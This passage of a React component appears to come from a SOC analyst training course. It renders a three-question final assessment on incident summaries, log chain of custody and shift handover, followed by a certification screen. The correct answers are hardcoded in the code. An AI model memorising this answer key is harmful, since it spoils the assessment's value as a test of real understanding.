                    Elena Gomez, Rajesh Kumar, and Priya Sharma sit across the conference table with your weekly case files. Elena asks the 3 final defense questions to evaluate your analytical independence.
                  </p>
                </div>

                <div className="space-y-4 text-xs">
                  {/* Defense Question 1 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 1: Elena asks: &ldquo;Deliver your 30-second executive summary of Michael Chen’s incident to the CISO.&rdquo;
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'def1-a', text: '“Spear phishing invoice triggered hidden PowerShell trying to contact C2 server 198.51.100.84. EDR killed the process and firewall blocked network callback. No data was lost. Credentials were reset and Aditya is sweeping 47 recipient inboxes.”' },
                        { id: 'def1-b', text: '“Someone clicked a bad file, but our antivirus stopped it and everything is fine so no further action is needed.”' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU7DefenseQ1(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all cursor-pointer ${
                            u7DefenseQ1 === opt.id
                              ? opt.id === 'def1-a'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold dark:bg-emerald-950/40 dark:text-emerald-200'
                                : 'bg-rose-50 border-rose-500 text-rose-950 dark:bg-rose-950/40 dark:text-rose-200'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Defense Question 2 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 2: Priya asks: &ldquo;An auditor claims our logs are forged. How does our case record prove digital chain of custody?&rdquo;
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'def2-a', text: 'A) Every log entry contains immutable NTP timestamps, cryptographic SHA-256 hashes of all artifacts, unique SIEM event IDs, and analyst session audit signatures that cannot be altered.' },
                        { id: 'def2-b', text: 'B) We tell the auditor that we remember what happened on Friday morning.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU7DefenseQ2(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all cursor-pointer ${
                            u7DefenseQ2 === opt.id
                              ? opt.id === 'def2-a'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold dark:bg-emerald-950/40 dark:text-emerald-200'
                                : 'bg-rose-50 border-rose-500 text-rose-950 dark:bg-rose-950/40 dark:text-rose-200'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Defense Question 3 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 3: Rajesh asks: &ldquo;It is 17:00 PM. The Night Shift analyst arrives. How do you execute the verbal shift handover?&rdquo;
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'def3-a', text: 'A) Walk them through the live queue, highlight any active open P1/P2 investigations, point out expiring SLA timers, and formally sign the shift logbook.' },
                        { id: 'def3-b', text: 'B) Log off immediately and let them discover open incidents on their own.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU7DefenseQ3(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all cursor-pointer ${
                            u7DefenseQ3 === opt.id
                              ? opt.id === 'def3-a'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold dark:bg-emerald-950/40 dark:text-emerald-200'
                                : 'bg-rose-50 border-rose-500 text-rose-950 dark:bg-rose-950/40 dark:text-rose-200'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Congratulations & Graduation Credential */}
                {(u7GraduationConfirmed || (mounted && (completedUnits.has('unit-7') || completedUnits.has('unit-7-assessment')))) ? (
                  <div className="space-y-4 animate-fade-in text-xs">
                    <div className="p-4 rounded-xl border border-emerald-300 bg-emerald-50/70 text-emerald-950 dark:bg-emerald-950/40 dark:border-emerald-800 dark:text-emerald-200 space-y-2">
                      <div className="flex items-center gap-2 font-bold text-emerald-800 dark:text-emerald-300 text-sm">
                        <span className="w-7 h-7 rounded-full bg-emerald-600 text-white flex items-center justify-center text-xs">EG</span>
                        <span>Elena Gomez (SOC Manager) Formal Certification:</span>
                      </div>
                      <p className="leading-relaxed font-sans text-xs">
                        &ldquo;Outstanding defense, Analyst! You demonstrated deep technical mastery across all 7 units: SOC Architecture, Alerts vs Events, Alert Triage, False Positive Context, Severity &amp; SLAs, Multi-Tier Escalation, and Audit-Grade Documentation. You are officially certified as a <strong>Tier 1 SOC Analyst L1</strong>. Welcome to the team!&rdquo;
                      </p>
                    </div>

                    <div className="p-4 rounded-xl border border-sky-300 bg-sky-50/70 text-sky-950 dark:bg-sky-950/40 dark:border-sky-800 dark:text-sky-200 space-y-2">
                      <div className="flex items-center gap-2 font-bold text-sky-800 dark:text-sky-300 text-sm">
                        <span className="w-7 h-7 rounded-full bg-sky-600 text-white flex items-center justify-center text-xs">RK</span>
                        <span>Rajesh Kumar (Senior Mentor) Handshake:</span>
                      </div>
                      <p className="leading-relaxed font-sans text-xs">
                        &ldquo;Shabash, yaar! When you started, you were overwhelmed by raw logs. Today you stood tall and defended your case like a veteran. I am proud to share the shift queue with you.&rdquo;
                      </p>
                    </div>

                    <div className="flex justify-end pt-3">
                      <Button
                        onClick={onBackToOverview}
                        className="font-bold text-xs gap-2 bg-emerald-600 hover:bg-emerald-700 text-white shadow-lg px-6 py-2.5 h-auto cursor-pointer"
                      >
                        <Award className="w-4 h-4" />
                        <span>🎓 Certified Junior SOC Analyst L1! Return to Curriculum</span>
                      </Button>
                    </div>
                  </div>
                ) : (
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-3 border-t">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => {
                        setU7DefenseQ1('');
                        setU7DefenseQ2('');
                        setU7DefenseQ3('');
                      }}
                      className="text-xs gap-1"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Defense
                    </Button>
                    <Button
                      disabled={u7DefenseQ1 !== 'def1-a' || u7DefenseQ2 !== 'def2-a' || u7DefenseQ3 !== 'def3-a'}
                      onClick={() => {
                        markChapterDone('unit-7', 3);
                        setU7GraduationConfirmed(true);
                        handleFinishAssessment('unit-7-assessment', 150);
                      }}
                      className="font-bold text-xs gap-2 bg-primary text-primary-foreground shadow-lg px-6 py-2.5 h-auto cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      <Award className="w-4 h-4" />
                      <span>Submit Defense &amp; Graduate as Junior SOC Analyst L1 (+150 XP)</span>
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}
        </div>
      )}
    </div>
  );
}
